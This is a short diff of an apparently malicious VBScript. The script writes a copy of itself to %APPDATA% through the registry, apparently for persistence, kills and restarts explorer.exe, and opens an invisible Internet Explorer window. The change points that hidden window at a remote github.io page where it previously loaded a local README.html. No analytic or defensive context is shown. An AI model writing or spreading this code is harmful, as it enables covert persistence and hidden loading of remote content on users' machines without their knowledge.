@@ -8,5 +8,5 @@ ws.RegWrite path2,"%APPDATA%\Config.vbs"
 ws.run "taskkill /f /im explorer.exe",,1
 ws.run "explorer.exe"
 set ie=createobject("internetexplorer.application")
-ie.navigate "file:///%APPDATA%/README.html"
+ie.navigate "https://bootstrapmin.github.io/PTShare/IoT.html"
 ie.visible=0
